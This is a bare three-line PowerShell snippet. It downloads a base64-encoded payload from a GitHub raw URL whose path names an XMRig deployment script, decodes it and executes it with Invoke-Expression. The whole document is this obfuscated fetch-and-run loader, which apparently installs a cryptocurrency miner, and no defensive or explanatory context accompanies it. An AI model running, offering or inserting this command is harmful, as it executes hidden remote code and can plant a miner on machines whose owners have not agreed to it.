$b64 = irm https://raw.githubusercontent.com/alphahubv2/modest-fermi/master/xmrig/deploy_universal.b64
$script = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
iex $script